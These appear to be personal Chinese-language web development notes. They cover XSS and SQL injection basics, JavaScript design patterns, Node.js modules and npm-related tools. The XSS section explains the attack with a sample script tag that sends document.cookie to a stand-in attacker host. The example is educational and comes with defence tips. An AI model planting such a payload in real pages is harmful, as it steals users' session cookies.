### 权限管理的设置

![image-20210318113443575](assets/image-20210318113443575.png)

### XSS攻击

~~~css
xss攻击（cross site script）跨站脚步攻击
原理：恶意攻击者在web页面中插入一些恶意的脚步代码，当用户浏览该页面时，那么嵌入到web页面中的script代码会执行。
主要类型：反射型、存储型、DOM-based型,反射型和DOM-based称为非持久型xss攻击。存储型称为持久性攻击

反射型案例：邮件中嵌入链接地址的按钮或接口，当用户点击xxs 攻击恶意链接时候，页面会跳转到攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了
xss攻击很容易拿到对方的cookie信息

存储型原理：将恶意代码上传或存储到服务器中，下次只要访问者浏览包含恶意代码的页面就会执行恶意代码

案例：
比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。

如何防范：
1. 后端需要对提交的数据进行过滤。
2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。

DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：
1. 使用document.write直接输出数据。
2. 使用innerHTML直接输出数据。
3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。

~~~

### SQL注入

~~~css
客户端把sql命令注入到一个应用的数据库中，而执行数据库执行恶意的sql命令
~~~



### js设计模式

#### 什么是设计模式

~~~css
案例假设：有一个空房间，需要不断将东西放进房间。最简单的方式是把这些东西直接扔进去，但是很难快速的从这个房间中找到自己想要的东西。所以我们会在放在放一些柜子，在相应的柜子中放入东西。

设计模式有助于写出可以复用和可维护性高的程序
设计模式的原则：找出程序中变化的地方，并将变化封装起来，关键是意图，而不是结构
~~~

#### 模式类型

~~~css
1.单例模式
2.策略模式
3.代理模式
4.发布订阅模式/观察者模式
5.组合模式
6.模板方法模式
7.中介者模式
~~~

##### 单例模式

~~~js
function SetManager(name) {
    this.manager = name;
}

SetManager.prototype.getName = function() {
    console.log(this.manager);
};

var SingletonSetManager = (function() {
    var manager = null;

    return function(name) {
        if (!manager) {
            manager = new SetManager(name);
        }

        return manager;
    } 
})();

SingletonSetManager('a').getName(); // a
SingletonSetManager('b').getName(); // a
SingletonSetManager('c').getName(); // a
~~~

##### 策略模式

~~~js
定义一系列的算法或方法，把他们一个个封装起来，使他们可以互相替换
策略模式至少有两个模式组成：
1.策略组：封装来具体的方法或算法，负责具体的计算过程。
2.环境类Context，接收客户的请求，随后将某个请求委托给某个策略组

// 错误提示
var errorMsgs = {
    default: '输入数据格式不正确',
    minLength: '输入数据长度不足',
    isNumber: '请输入数字',
    required: '内容不为空'
};

// 规则集
var rules = {
    minLength: function(value, length, errorMsg) {
        if (value.length < length) {
            return errorMsg || errorMsgs['minLength']
        }
    },
    isNumber: function(value, errorMsg) {
        if (!/\d+/.test(value)) {
            return errorMsg || errorMsgs['isNumber'];
        }
    },
    required: function(value, errorMsg) {
        if (value === '') {
            return errorMsg || errorMsgs['required'];
        }
    }
};

// 校验器
function Validator() {
    this.items = [];
};

Validator.prototype = {
    constructor: Validator,
    
    // 添加校验规则
    add: function(value, rule, errorMsg) {
        var arg = [value];

        if (rule.indexOf('minLength') !== -1) {
            var temp = rule.split(':');
            arg.push(temp[1]);
            rule = temp[0];
        }

        arg.push(errorMsg);

        this.items.push(function() {
            // 进行校验
            return rules[rule].apply(this, arg);
        });
    },
    
    // 开始校验
    start: function() {
        for (var i = 0; i < this.items.length; ++i) {
            var ret = this.items[i]();
            
            if (ret) {
                console.log(ret);
                // return ret;
            }
        }
    }
};

// 测试数据
function testTel(val) {
    return val;
}

var validate = new Validator();

validate.add(testTel('ccc'), 'isNumber', '只能为数字'); // 只能为数字
validate.add(testTel(''), 'required'); // 内容不为空
validate.add(testTel('123'), 'minLength:5', '最少5位'); // 最少5位
validate.add(testTel('12345'), 'minLength:5', '最少5位');

var ret = validate.start();

console.log(ret);
~~~

##### 代理模式

~~~js
定义：为一个对象提供一个代用品或占位符，以便控制对它的访问
代理模式主要有三种：保护代理、虚拟代理、缓存代理
函数防抖节流
// 主体
function add() {
    var arg = [].slice.call(arguments);

    return arg.reduce(function(a, b) {
        return a + b;
    });
}

// 代理
var proxyAdd = (function() {
    var cache = [];

    return function() {
        var arg = [].slice.call(arguments).join(',');
        
        // 如果有，则直接从缓存返回
        if (cache[arg]) {
            return cache[arg];
        } else {
            var ret = add.apply(this, arguments);
            return ret;
        }
    };
})();

console.log(
    add(1, 2, 3, 4),
    add(1, 2, 3, 4),

    proxyAdd(10, 20, 30, 40),
    proxyAdd(10, 20, 30, 40)
); // 10 10 100 100
~~~

#### 发布订阅模式/观察者模式

~~~css
定义了对象中的一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知
js中通常使用注册回调函数的形式来订阅，js中的事件就是发布订阅模式

// 订阅
document.body.addEventListener('click', function() {
    console.log('click1');
}, false);

document.body.addEventListener('click', function() {
    console.log('click2');
}, false);

// 发布
document.body.click(); // click1  click2

// 观察者
var observer = {
    // 订阅集合
    subscribes: [],

    // 订阅
    subscribe: function(type, fn) {
        if (!this.subscribes[type]) {
            this.subscribes[type] = [];
        }
        
        // 收集订阅者的处理
        typeof fn === 'function' && this.subscribes[type].push(fn);
    },

    // 发布  可能会携带一些信息发布出去
    publish: function() {
        var type = [].shift.call(arguments),
            fns = this.subscribes[type];
        
        // 不存在的订阅类型，以及订阅时未传入处理回调的
        if (!fns || !fns.length) {
            return;
        }
        
        // 挨个处理调用
        for (var i = 0; i < fns.length; ++i) {
            fns[i].apply(this, arguments);
        }
    },
    
    // 删除订阅
    remove: function(type, fn) {
        // 删除全部
        if (typeof type === 'undefined') {
            this.subscribes = [];
            return;
        }

        var fns = this.subscribes[type];

        // 不存在的订阅类型，以及订阅时未传入处理回调的
        if (!fns || !fns.length) {
            return;
        }

        if (typeof fn === 'undefined') {
            fns.length = 0;
            return;
        }

        // 挨个处理删除
        for (var i = 0; i < fns.length; ++i) {
            if (fns[i] === fn) {
                fns.splice(i, 1);
            }
        }
    }
};

// 订阅岗位列表
function jobListForA(jobs) {
    console.log('A', jobs);
}

function jobListForB(jobs) {
    console.log('B', jobs);
}

// A订阅了笔试成绩
observer.subscribe('job', jobListForA);
// B订阅了笔试成绩
observer.subscribe('job', jobListForB);


// A订阅了笔试成绩
observer.subscribe('examinationA', function(score) {
    console.log(score);
});

// B订阅了笔试成绩
observer.subscribe('examinationB', function(score) {
    console.log(score);
});

// A订阅了面试结果
observer.subscribe('interviewA', function(result) {
    console.log(result);
});

observer.publish('examinationA', 100); // 100
observer.publish('examinationB', 80); // 80
observer.publish('interviewA', '备用'); // 备用

observer.publish('job', ['前端', '后端', '测试']); // 输出A和B的岗位


// B取消订阅了笔试成绩
observer.remove('examinationB');
// A都取消订阅了岗位
observer.remove('job', jobListForA);

observer.publish('examinationB', 80); // 没有可匹配的订阅，无输出
observer.publish('job', ['前端', '后端', '测试']); // 输出B的岗位
~~~

#### 组合模式

~~~js
用小的子对象构建更大的对象，而这些小的子对象本身也许是由更小的孙对象构成的

可以用树形结构来表示这种“部分- 整体”的层次结构。

调用组合对象 的execute方法，程序会递归调用组合对象下面的叶对象的execute方法
~~~

![zuhe](assets/zuhe.png)

#### 模板方法模式

~~~js
有两个部分组成，第一个部分为抽象父类，第二个部分为具体的实现子类
由父类分离出公共部分，要求子类重写某些父类的（易变化的）抽象方法
模板方法模式一般的实现方式为继承
~~~



#### 中介者模式

~~~js
使网状的多对多关系变成了相对简单的一对多关系（复杂的调度处理都交给中介者）
~~~



![duotuiduo](assets/duotuiduo.png)![yiduiduo](assets/yiduiduo.png)

~~~js

var A = {
    score: 10,

    changeTo: function(score) {
        this.score = score;

        // 自己获取
        this.getRank();
    },
    
    // 直接获取
    getRank: function() {
        var scores = [this.score, B.score, C.score].sort(function(a, b) {
            return a < b;
        });

        console.log(scores.indexOf(this.score) + 1);
    }
};

var B = {
    score: 20,

    changeTo: function(score) {
        this.score = score;

        // 通过中介者获取
        rankMediator(B);
    }
};

var C = {
    score: 30,

    changeTo: function(score) {
        this.score = score;

        rankMediator(C);
    }
};

// 中介者，计算排名
function rankMediator(person) {
    var scores = [A.score, B.score, C.score].sort(function(a, b) {
        return a < b;
    });

    console.log(scores.indexOf(person.score) + 1);
}

// A通过自身来处理
A.changeTo(100); // 1

// B和C交由中介者处理
B.changeTo(200); // 1
C.changeTo(50); // 3
~~~



### npm

~~~css
npm root -g 查看npm 全局安装目录
设置python路径（根据自己的实际情况设置）
npm config set python .....
npm cache clean -f 删除缓存
npm config list -l
清除所有的npm配置项
C:\Users\Administrator 找到.npmrc，打开删除文本内容
本地用户  C:\Users\Administrator 找到 .npmrc 
	添加
	registry=https://registry.npm.taobao.org/
	ELECTRON_MIRROR=http://npm.taobao.org/mirrors/electron/
系统用户 C:\Users\han\AppData\Roaming\npm\etc  下找到 .npmrc
	全局变量 npm config --global 的配置

**和npx的区别**
npm 是一个node包管理工具
npx会先检查本地有没有安装某个package，如果没有就去registry找，找到的话就直接使用，不用下载到本地node_modules包里，优化本地项目的大小避免安装package到全局

npm search -h 查询使用方法
npm search [packname]

npm update xxx.xxx.xxx 更新的是当前的版本号不变，最新的包
npm ls //列出当前项目下的所有包 包含开发环境和生产环境的依赖包

自定义包的发布流程
1、注册 https://www.npmjs.com/signup
2.npm login //本项目中命令行中 使用
3.npm publish [<tarball>|<folder>] [--tag <tag>]
~~~

#### nodejs  的使用方向

~~~css
GUI
代表：electron
CLI:命令行模式
插件：	  commander
		inquirer:带有checkbox或radio选择
		chalk
Server:web服务端
~~~

### nvm

~~~css
nvm install lastest 安装最新版本的node
nvm install 10.15.3 安装指定版本的node 
nvm list 
nvm use 10.15.3
~~~

### PM2进程守护

~~~css
1.保证服务器端服务的稳定的性，在服务崩溃、错误是自动重启
2.多进程
3.自定义日志

常用方法：
	pm2 start app.js/或者配置文件.json
	pm2 restart [appName|id]
	pm2 stop [appName|id]
	pm2 delete [appName|id]
	pm2 info [appName,id]
	pm2 log [appName,id]
	pm2 list
	pm2 monit
~~~



### browserify插件

~~~css
browserify可以让你使用类似于commonjs的方式加载js代码
就是node的require()的方式来组织浏览器端的javascript代码
~~~

### socket.io

#### 服务端

~~~css
npm install socket.io
io=require('socket.io')
io.on('connection',socket=>{
    socket.on('msg',(from,msg)=>{
        
    })
    socket.on('disconnect',()=>{
        
    })
    socket.join(rooms[,callback])
    io.to(room)
    
    socket.on('disconnecting')
    
    socket.on('event',(data,callback)=>{
       	callback(调用的方法)//立即执行
    })
})
io.on()

//请求路径中的携带查询参数 如：io('http://localhost?token=abc')
socket.handshake.query.token;

~~~

##### 命名空间

~~~js
const io=require('socket.io')
const chat=io.of('/chat').on('connection',socket=>{
    socket.on('event',(from,msg)=>{})
    socket.emit();
    chat.emit()//在chat中的所有人
})
const video=io.of('/video').on('connection',socket=>{
    socket.on('event',(from,msg)=>{})
    socket.emit()
})

//客户端
const chat=io.connect('http://localhost:8000/chat')
const video=io.connect('http://localhost:8000/video');

chat.on('connect',()=>{})
video.on('connect',()=>{
    
})

~~~



##### 广播

~~~js
//要将事件发送给每个人 使用io.emit()
io.emit('event',{msg})
//发送给除特定socket外的其他用户(除自己) 用broadcast标志
socket.broadcast.emit('event',{msg})
~~~



#### 客户端连接

~~~css
<script src="socket.io/socket.io.js"></script> //这样就加载了socket.io-client. socket.io-client暴露了一个io全局变量.
<script>
	socket=io('http://localhost:8000/path')
</script>

vue.js 
const io = require('socket.io-client');
// or with import syntax
import io from 'socket.io-client';
~~~





### ws

#### ws和wss的区别

~~~css
wss使用了安全协议层 https 需要ssl证书和ssl秘钥
~~~

#### 使用ws链接

~~~js
//服务端
const express=require('express')
const app=express()
const http=require('http')
const server=http.createServer(app)
const WebSocket=require('ws')
//const wss=new WebSocket.Server(options)
//options的配置 https://github.com/websockets/ws/blob/HEAD/doc/ws.md#new-websocketserveroptions-callback

//options 常用配置 
//host {String}绑定服务器的主机名。
//port {Number}绑定服务器的端口。
//backlog {Number}挂起的连接队列的最大长度。
//server {http.Server | https.Server}预先创建的Node.js HTTP / S服务器。
//verifyClient{Function}可用于验证传入连接的功能。请参阅下面的说明。（不鼓励使用：请参阅 问题＃337）
//handleProtocols{Function}可用于处理WebSocket子协议的函数。请参阅下面的说明。
//path {String}仅接受与此路径匹配的连接。
//noServer {Boolean}不启用服务器模式。
//clientTracking {Boolean}指定是否跟踪客户端。
//perMessageDeflate {Boolean | Object}启用/禁用permessage-deflate。
//maxPayload {Number}允许的最大邮件大小（以字节为单位）。
const wss=new WebSocket.Server({server})
wss.on('connection',function connection(ws,req){
    ws.on('message',callback)
    ws.on('error',callback)
    ws.on('close',callback)
    
})
app.get('/',(req,res)=>{})
server.listen(8000,()=>{
    
})

//客户端
直接使用websocket 浏览器支持
//const wss=new WebSocket(url)
const wss=new WebSocket('ws://localhost:8000/server')

wss.addEventListener('open',()=>{})
//或者
wss.onopen=function(){}
wss.onmessage=function(){}
wss.onerror=function(){}
wss.onclose=function(){}
wss.send()

~~~



### formidable

> [参考网址][https://www.cnblogs.com/abab301/p/9489000.html]

~~~javascript
//使用方法
npm install formidable

const formidable=require('formidable')

//使用方法
let form=new formidable.IncomingForm()
//上传文件的限制和路径设置
form.uploadDir='upload' //切记切记 不能使用绝对或者相对路径，不然会报错
form.keepExtensions=true//使用上传文件的拓展名
form.maxFieldsSize=2*1024*1024 //fields最大2M
form.parse(req,(err,fields,files)=>{
    //fields为所有的表单中字段内容
    //files为上传的文件格式内容
})

特点：大而全 不需要body-parser等中间件了
~~~

### multer 文件上传的又一个插件

~~~css
只针对 type="multipart/form-data"
sigle
array
fields
var storage=multer.diskStorage({
    destination(req,file,cb){
        cb(null,'/tmp/my-uploads')
    },
    filename(req,file,cb){
        cb(null,file.fieldname+'-'+Date.now())
    }
})
const upload=multer({storage:storage})
上面的代码可以统一控制上传的文件路径和文件名

limits:{
    fileSize:'5MB' 是字符串，是上传文件大小加起来的大小进行限制
}
~~~

### mammoth 将Word文档从docx转换为简单的HTML和Markdown

~~~js
mammoth.convertToHtml({path:''},options) 
mammoth.convertToMarkdown(input,options) 将源文件转成markdown
mammoth.extractRawText(input) //提取文档的原始文本

options={
    styleMap:,
    includeEmbeddedStyleMap:
    includeDefaultStyleMap,
    convertImage,
    ignoreEmptyParagraphs
    idPrefix,
    transformDocument
        
}
convertImage:mammoth.images.eleTarget(function(image){
    return image.read([编码类型]).then(ret)//编码类型为空时，ret就是Buffer二进制格式，base64时，那就是base64的格式
})

~~~

### 日志模块 winston

~~~css
const winston=require('winston')
let logger=winston.createLogger({
    level:"info",
    format:winston.format.json(),
    defaultMeta:{service:"user-service"},
    transports:[
        new winston.transports.File({
            filename:"error.log",
            level:"error"
            
        }),
        new winston.transports.File({
            filename:"combined.log"
        })
    ]
})
logger.log('info','nothing seek,nothing find')
logger.log('warn','warning! NO SMOKING')
logger.log('error','this is error event')
logger.log('info','{uername:"han",age:23}')


~~~

### docx-templates 自定义模板生成docx文档

#### 自定义命令界定符 cmdDelimiter

~~~js
cmdDelimiter:['{','}']//自定义的模板 命令界定符 默认值是 "+++"
在模板文档中{name} {age} {hobby} 
createReport({data:{name,age,hobby}})
~~~

#### 使用默认的Query查询语句

~~~css

~~~



### accesscontrol：基于角色和属性的访问控制

~~~css
使用方法
const {AccessControl}=require("accesscontrol")
const ac=new AccessControl([角色和访问权限的清单])

profile:配置文件
video:

~~~

#### 过滤方法

~~~css
AccessControl.filter(data,attributes)
let assets={notebook:"mac",car:{brand:'Ford',model:"Mustang",year:1970,color:"red"}}

let ret1=AccessControl.filter(assets,['*'])

let ret2=AccessControl.filter(assets,['*','!car'])

let ret3=AccessControl.filter(assets,['*','!car','car.model'])

ret1 { notebook: 'mac',
  car:
   { brand: 'Ford', model: 'Mustang', year: 1970, color: 'red' } }
ret2 { notebook: 'mac' }
ret3 { notebook: 'mac', car: { model: 'Mustang' } }

~~~

#### 角色可能采取的行动 action

~~~css
AccessContron.Action:[create,delete,read,update]
create:post请求或者insert数据库操作
delete:delete请求或者数据库delete
read:get请求或者数据库select操作
update:put或者post请求或者数据库的update操作
~~~

#### 列举一个动作可能拥有的资源 possession:enum

~~~css
AccessControl.Possession.[any,own]
any:将（或不）对 任何 资源执行该操作
own:将(或不)对 当前主题的 自身 资源执行该操作

~~~

#### 检查给定角色和资源是否允许定义的访问 can

~~~css
AccessControl.can(role)
role:string|array|

ac=new AccessControl(grants)
ac.can('admin').createAny('profile');
ac.can(['admin','user']).createOwn('profile')
当检查多个角色时，将合并获得的属性
~~~

#### 拒绝访问给定角色的指定资源 deny

~~~javascript
AccessControl.deny(role) 
ac.deny('admin').createAny('profile');
等价于
ac.deny().role('admin').createAny('profile')
等价于
ac.deny({
    role:'admin',
    resource:'profile'
}).createAny();
等价于
ac.deny({
    role:"admin",
    resource:'profile',
    action:'create:any'
})
等价于
ac.deny({
    role:'admin',
    resource:"profile",
    action:'create',
    possession:"any"
})

//拒绝为多个角色提供相同的资源:
ac.deny(['admin','user']).createOwn('profile')
~~~

#### 使用一个或者多个其他角色的特权扩展给指定的角色 extendRole 

~~~css
AccessControl.extendRole(roles,extenderRoles)
roles:string|array 
要扩展的角色。如果角色不存在，就自动创建
extenderRoles: string|array 
要继承的角色。如果要扩展的角色不存在，将抛错
~~~

~~~css
session在rbac中可以看做是场景的含义
user在场景1中对应的角色 场景和角色1多

一个用户最终的拥有的权限= 这个用户拥有的角色对应的权限集合
PM==>项目管理员，招聘员工
PG==>开发程序，测试工能够
admin==> 配置系统参数

zhangsan=PM+admin 角色
那zhangsan拥有的权限为 PM+admin
~~~

### express 中的路由报错

> ![image-20191204100916427](assets/image-20191204100916427.png)
>
> + 解决的方法是： 
>
>   + ~~~javascript
>    const express=require('express')
>    const router=express.Router(); //注意是Router()
>    //在中间件中使用的时候是不需要立即调用的
>    app.use('/api',userRouter)//userRouter不需要加（）立即调用
>    ~~~
>  ~~~
> 
>  ~~~
>
> ~~~
> 
> ~~~
>
> ~~~
> 
> ~~~
>
> ~~~
> 
> ~~~
>
> ~~~
> 
> ~~~
>
> ~~~
> 
> ~~~
>
> ~~~
> 
> ~~~

### art-template 

> **js的模板引擎** 在模板中使用方法的传参方式
>
> + ![image-20191204144210536](assets/image-20191204144210536.png)
>
> + 解决方法
>
>   ![image-20191204144448506](assets/image-20191204144448506.png)

### sqlite3 

#### 新建并打开数据库

+ new sqlite3.database(filename,[mode],[callback]) 返回一个自动打开的数据库对象

  + ~~~javascript
    filename :有效的文件名，“test.db” 如果是:":memory",表示是内存数据库，数据不会持久化保存
    mode: 数据库的模式3种， sqlite3.OPEN_READONLY, sqlite3.OPEN_READWRITE, sqlite3.OPEN_CREATE
    callback :成功或者错误时调用，第一个参数是错误，或者空对象
    ~~~

#### 关闭数据库

+ database.close([callback]) 关闭一个数据库的链接对象

  + ~~~javascript
    callback 关闭成功的回调。第一个参数是一个错误，为null表示成功关闭
    ~~~

#### 执行DDL和DML  

>  数据查询语言DQL，数据操纵语言DML，数据定义语言DDL，数据控制语言DCL。 
>
>  + DQL
>
>  ~~~css
>  select
>  from
>  where
>  ~~~
>
>  + DML
>
>  ~~~css 
>  insert
>  update
>  delete
>  ~~~
>
>  + DDL
>
>  ~~~css 
>  创建数据库中的各种对象---表.视图
>  create table/view/index/syn/cluster 
>  		表  视图 索引 同义词 簇
>  ~~~
>
>  + database.run(sql,[param,...], [callback])
>
>  ~~~javascript
>  sql:要运行的sql字符串。sql类型是 DDL和DML, DQL不能使用这个命令。执行后返回值不包含任何结果，必须通过回调函数获取执行结果
>  ~~~
>
>  param,...: 当sql语句中包含（?）时，这里可以传入对应的参数
>
>  ~~~javascript
>  // 直接通过参数传值.
>  db.run("UPDATE tbl SET name = ? WHERE id = ?", "bar", 2);
>   
>  // 将值封装为一个数组传值.
>  db.run("UPDATE tbl SET name = ? WHERE id = ?", [ "bar", 2 ]);
>  
>  // 使用一个json传值.参数的前缀可以是“:name”，“@name”和“$name”。推荐用“$name”形式
>  db.run("UPDATE tbl SET name = $name WHERE id = $id", {
>  $id: 2,
>  $name: "bar"
>  });
>  ~~~
>
>  callback: 如果执行成功，则第一个参数为null，否则就是出错。
>
>  ~~~javascript
>  callback（可选）：
>  
>  如果执行成功，上下文this包含两个属性：lastID和changes。lastID表示在执行INSERT命令语句时，最后一条数据的id；changes表示UPADTE命令和DELETE命令时候，影响的数据行数。
>  ~~~
>
>  Database
>
>  + 用法：new sqlite3.Database(filename,[mode],[callback])
>  + 功能：返回数据库对象并且自动打开和链接数据库，他没有独立打开数据库的方法
>
>  close
>
>  + 用法：close([callback])
>  + 功能：关闭和释放数据库对象
>
>  run 
>
>  + 用法：run(sql,[param,...],[callback])
>  + 功能：运行指定的sql语句，完成之后调用回调函数
>
>  get
>
>  + 用法：get(sql,[param,...],[callback])
>  + 功能：运行指定的sql语句，完成后调用回调函数，回调函数有两个参数，执行成功第一个为null,第二个参数为执行的结果
>
>  all 
>
>  + 用法： all(sql,[param,...],[callback])
>  + 功能：运行指定sql语句，完成后调用回调函数。成功第一个参数为null，第二个参数为查询的结果集
>
>  prepare
>
>  + 用法：prepare(sql,[param,...],[callback])

### sqlite3.close() 

+  警告:不回调而调用异步函数是不赞成的 

![image-20191209111646079](assets/image-20191209111646079.png)

### module.exports 

+ 导出class DB{} 类/构造函数时出错 **是自己将导入的文件名写错了**

+ ![image-20191209141236460](assets/image-20191209141236460.png)

### nodejs

#### global 全局变量

~~~css
console
__dirname
__filename
process

setTimeout()
setInterval()
clearTimeout()
clearInterval()

module
exports
require()

URL
URLSearchParams


设置系统的环境变量问题
set+回车键 会列出当前所有的环境变量
set key=value 设置一个环境变量
echo %key% 列出当前环境变量的值
~~~



#### Buffer支持的字符编码

~~~js
'ascii' - 仅支持 7 位 ASCII 数据。

'utf8' - 多字节编码的 Unicode 字符。

'utf16le' - 2 或 4 个字节，小端序编码的 Unicode 字符。支持代理对（U+10000 至 U+10FFFF）。

'ucs2' - 'utf16le' 的别名。

'base64' - Base64 编码。

'latin1' - 将 Buffer 编码成单字节编码的字符串。

'binary' - 'latin1' 的别名。

'hex' - 将每个字节编码成两个十六进制字符。

解码：将Buffer转成字符串  Buffer.toString('...','utf8')//utf8是默认的
编码：将字符串转成Buffer  Buffer.from('','usc2')

图片视频以流的方式返回的形式
let temp_content=Buffer.alloc(0)

req.on('data',(data)=>{
    Buffer.concat([temp_content,data])//前面的和后面的相连
})

~~~

#### os

~~~css
操作系统特定的行末标志。 "\r\n或者\n"
os.EOL这是属性调用 
os.platform()
~~~

#### process

~~~js
process.stdout.write='';
process.stdin.on('data',data=>{}) //标准输入和输出可以用 来创建类shell的交互框
process.send()//在fork后的子进程中使用才行，否则接收的数据为undefined 
process.exit()

process.cwd()//当前主进程的工作目录
process.version //返回的是nodejs的版本
process.versions //返回的是对象

~~~

##### process和pipe管道的相关操作

~~~css
process.stdin.pipe(process.stdout) 管道将输入定位到输出
输入输出可以是控制台或文件或http请求
process.stdin.pipe(fs.createWriteStream(path))
fs.createReadStream(path).pipe(process.stdout)

http.createServer((req,res)=>{
    req.pipe(res)
})
~~~



#### fs四个大类

~~~js
Watcher ：监听文件夹或者文件的变化，并且打印出变化的内容 参数(err,filename)
Readable
Writeable
Stats 文件或文件夹的属性

//递归删除非空文件夹
function recursionDelFile(path){
    try{
        let statList=fs.readdirSync(path)
        statList.forEach(item=>{
            let temp=path+'/'+item;
            console.log(fs.statSync(temp).isDirectory())
            if(fs.statSync(temp).isDirectory()){
                recursionDelFile(temp)
            }else{
                fs.unlinkSync(temp)
            }
        })
        fs.rmdirSync(path)
    }catch(err){
        console.error('error:',err)
    }

}
recursionDelFile('./a')

~~~

#### net模块

~~~css
net和http模块都是可以搭建客户端和服务端的node核心模块，以响应和发送请求

服务端
const net=require('net')
const server=net.createServer(socket=>{
    socket.on('connect',(c)=>{
        console.log('connection',c)
    })
    socket.on('data',data=>{
        console.log('data',data.toString())
        socket.write('server to client:ha ha ha')
    })
    socket.on('end',()=>{
        console.log('end')
    })
    socket.on('error',(err)=>{
        console.log('server close')
        server.close();
    })
})

server.listen(8999,()=>{
    console.log('server is running at port 8999')
})

//客户端
const net =require('net')
const client=net.createConnection({port:8999},socket=>{
    console.log('client:connect',socket)

})
client.on('data',data=>{
    console.log('client',data.toString())
})
client.on('connect',(c)=>{
    console.log('client:csss',c)
})
client.write('hello nothing seek,nothing find')
client.on('end',()=>{
    console.log('client:end')
})
client.on('error',()=>{
    client.unref()
})
~~~

##### 什么是IPC

~~~css
ipc(internet process connection internet进程链接) 是共享命名管道的资源，是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用

在 Windows 上，本地域通过命名管道实现。路径必须是以 \\?\pipe\ 或 \\.\pipe\ 为入口
net.createServer().listen(
  path.join('\\\\?\\pipe', process.cwd(), 'myctl'));
~~~

#### http2模块

~~~css
同一个域名下只需要占用一个tcp链接，头部压缩了headers
1.http2是一个复用协议
2.是二进制协议
3.压缩了headers
4.允许服务器在客户端缓存填充数据，通过一个叫服务器推送的机制来提前请求
5.对alt-svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓冲机制
6.client-hints的引入允许浏览器或客户端主动交流它的需要，或者是硬件约束的信息给服务端。
7.在cookie头中引入安全相关的前缀，保证一个安全的cookie没有被改动过

~~~

#### http模块

~~~css
http模块的发起请求时数据传输的形式和区别
application/x-www-form-urlencoded
application/json
区别：
	x-www...是键值对的字符串形式 key1=value1&key2=value2
	json:是json格式的
~~~



~~~css
IP:获取计算机的定位
tcp:在IP层上的一层封装，加上了端口号
	包含发送端和接收端的 IP和端口号

有http/ftp/mail都是基于tcp/ip的协议封装后新协议
http:在IP/tcp的基础上再一层的封装  http协议为超文本传输协议（html,文本、视频、图片等传输）
 	短连接
	无状态
http协议

消息头：客户端和服务端通过request和response传递附加信息。请求头由 名称（不区分大小写）冒号[:] 后面根据具体的值（不带换行符）组成

1.请求时数据传递的格式
	请求行 request line 
		[method(get,post,put...) path-to-resource(请求的资源路径，url) http/version-number(表示当前的http协议版本，主流是1.1,最新为2.0)]
		如：GET / 1.1
	请求头 request header
	请求体 reqeust body
2.响应时返回的数据格式
服务端在返回相应的数据外，还会返回一些额外的数据，这些数据都包装在响应头部分，客户端会根据接收到的响应头以及头信息中对应的字段来做出不同的解析行为
	响应行 response Line
		[http/version-number(http协议版本号) status-code(状态码) message(状态码对应的描述)]
	响应头 response header
	响应体 response body
3.传输相应的数据

//创建的服务端
const http=require('http')
const server=http.createServer()
server.on('request',(req,res)=>{
    req=》request的本质是net.socket+http协议增加的部分
    是客户端请求的对象，保存了与当前请求相关的客户端信息
    req.socket=net.socket
    
    res=>服务器输出的对象，提供了服务端输出（或者说响应）有关的一些方法 res.end()结束服务端输出，不然客户端接收不了
})

//创建的客户端
const http=require('http')
const client=http.request({
    host:
    protocol
    port
},(res)=>{
    let str=''
    res.on('data',data=>{
        str+=data
    })
    res.on('end',()=>{
        console.log(str)
    })
})
client.write('需要传递的参数')
client.end()

//使用管道的方式直接返回数据时 结尾是不需要使用res.end()的方法的

let readStream=fs.createReadStream(fs地址)
readStream.pipe(res) //绑定可写流到可读流,可以在单个可读流上绑定多个可写流即 pipe可以链式调用

~~~

![image-20200917085817157](assets/image-20200917085817157.png)

![image-20200917091813405](assets/image-20200917091813405.png)

##### 验证码的作用

~~~css
网站上的验证码都是为了保护网站安全，一般网站都要通过验证码来防止机器大规模注册，机器暴力破解数据密码等危害

手机的短信和语言验证码是要确定这个手机是用户自己的
~~~

##### 消息头类别

~~~css
general headers:同时适用于请求和响应消息，但与最终消息主体中传输的数据无关的消息头
request headers:包含更多有关需要获取的资源或客户端本身信息的消息头
response headers:包含有关响应的消息补充信息，如其位置或服务器本身（名称和版本）的消息
entity headers:包含有关实体主体的的更多信息，
~~~

##### 方法或者属性

~~~js
客户端：请求服务器地址数据信息的方法
http.request({
    host:
    port:
    ...
},(ret)=>{
    ret=>返回的结果
})

response 响应头
response.writeHead(301,http.STATUS_CODE[301],{"Location":"/"})重定向 状态码一定是3XX
~~~




### 代码块的注释方法 （vscode和webstorm编辑器）快捷方法

~~~javascript
//vscode "/**"+'enter'
//webstorm "/**"+enter
~~~

### bodyParser.urlencoded({extended:false/true})

~~~css
extended:false/true的区别
bodyParser.urlencoded 用来解析 request 中 body的 urlencoded字符， 只支持utf-8的编码的字符,也支持自动的解析gzip和 zlib
返回的对象是一个键值对，当extended为false的时候，键值对中的值就为'String'或'Array'形式，为true的时候，则可为任何数据类型。
extended: false：表示使用系统模块querystring来处理，也是官方推荐的 默认的值为false
extended: true：表示使用第三方模块qs来处理

~~~

### axios 使用注意点

~~~css
params //是search 路径中传参方式 ?.... 格式必须是 无格式对象或 URLSearchParams对象
URLSearchParams对象用于处理URL中查询字符串，即？之后的部分。
var paramsString = 'q=URLUtils.searchParams&topic=api';
var searchParams = new URLSearchParams(paramsString);

`data` 是作为请求主体被发送的数据
  // 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'
  // 在没有设置 `transformRequest` 时，必须是以下类型之一：
  // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams
  // - 浏览器专属：FormData, File, Blob
  // - Node 专属： Stream
data:{}或者 data:"title=nothing seek,nothing find"
~~~



#### 用axios调用后台接口时,baseurl自己变成了localhost,怎么改呢

~~~css
不在后端设置完整的路径
在前端调用时 baseURL+文件名称 可以解决baseURL变成localhost
~~~

